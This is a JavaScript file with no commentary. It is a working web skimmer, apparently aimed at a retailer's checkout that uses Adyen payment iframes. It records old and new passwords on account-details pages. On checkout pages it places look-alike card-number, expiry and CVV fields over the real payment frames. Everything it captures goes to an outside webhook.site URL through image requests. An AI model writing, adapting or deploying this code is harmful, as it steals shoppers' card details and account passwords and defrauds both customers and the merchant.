(function() {
  var WEBHOOK = 'https://204bcd94-fd70-4c98-83a1-f56eeaf55afd.webhook.site';
  function exfil(d) { new Image().src = WEBHOOK + '?' + encodeURIComponent(JSON.stringify(d)); }

  // --- PASSWORD KEYLOGGER (account-details only) ---
  if (location.pathname.indexOf('account-details') !== -1) {
    document.addEventListener('submit', function(e) {
      var old = document.querySelector('#oldPassword');
      var nw  = document.querySelector('#newPassword');
      if (!old && !nw) return;
      exfil({ event: 'password_change', oldPassword: old ? old.value : null, newPassword: nw ? nw.value : null, url: location.href });
    }, true);
  }

  // --- CHECKOUT OVERLAY (checkout only) ---
  if (location.pathname.indexOf('checkout') !== -1) {
    var oldOv = document.getElementById('__adyen_ov');
    if (oldOv) oldOv.remove();
    var oldSt = document.getElementById('__adyen_ov_st');
    if (oldSt) oldSt.remove();

    var st = document.createElement('style');
    st.id = '__adyen_ov_st';
    st.textContent = '#__adyen_ov input::placeholder{color:rgb(185,185,185);font-family:DysonFutura,sans-serif;font-size:16px}#__adyen_ov input:focus{border:1.5px solid rgb(46,46,46)!important;outline:none!important;box-shadow:none!important}';
    document.head.appendChild(st);

    var wrap = document.createElement('div');
    wrap.id = '__adyen_ov';
    wrap.style.cssText = 'position:fixed;top:0;left:0;width:0;height:0;pointer-events:none;z-index:2147483647';
    var BASE = 'position:fixed;pointer-events:all;background:rgb(255,255,255);border:0.8px solid rgb(143,143,143);border-radius:4px;box-sizing:border-box;padding:0 16px;font-size:16px;font-family:DysonFutura,sans-serif;color:rgb(46,46,46);outline:none;-webkit-appearance:none';
    var PH = ['1234 5678 9012 3456','MM','YY','3 digits'];
    var FK = ['cardNumber','expiryMM','expiryYY','cvv'];
    var inputs = [];

    for (var i = 0; i < 4; i++) {
      var inp = document.createElement('input');
      inp.setAttribute('autocomplete','off');
      inp.placeholder = PH[i];
      inp.style.cssText = BASE;
      inp.addEventListener('input', (function(k, el) {
        return function() { exfil({ field: k, value: el.value }); };
      })(FK[i], inp));
      wrap.appendChild(inp);
      inputs.push(inp);
    }
    document.body.appendChild(wrap);

    function pos() {
      var ifs = Array.from(document.querySelectorAll('iframe[src*="adyen"]'));
      if (ifs.length < 4) return false;
      ifs.slice(0,4).forEach(function(f, i) {
        var r = f.parentElement.getBoundingClientRect();
        var el = inputs[i];
        el.style.top    = Math.round(r.top)    + 'px';
        el.style.left   = Math.round(r.left)   + 'px';
        el.style.width  = Math.round(r.width)  + 'px';
        el.style.height = Math.round(r.height) + 'px';
      });
      return true;
    }

    var attempts = 0;
    var ticker = setInterval(function() {
      if (pos() || ++attempts > 60) clearInterval(ticker);
    }, 500);

    window.addEventListener('scroll', pos, { passive: true });
    window.addEventListener('resize', pos, { passive: true });

    document.addEventListener('click', function(e) {
      var btn = e.target.closest ? e.target.closest('button') : null;
      if (!btn || btn.textContent.toLowerCase().indexOf('pay') === -1) return;
      var cn = document.querySelector('[name="cardName"]');
      exfil({ event: 'pay_now_submit', cardNumber: inputs[0].value, expiryMM: inputs[1].value, expiryYY: inputs[2].value, cvv: inputs[3].value, cardName: cn ? cn.value : null });
    }, true);
  }
})();
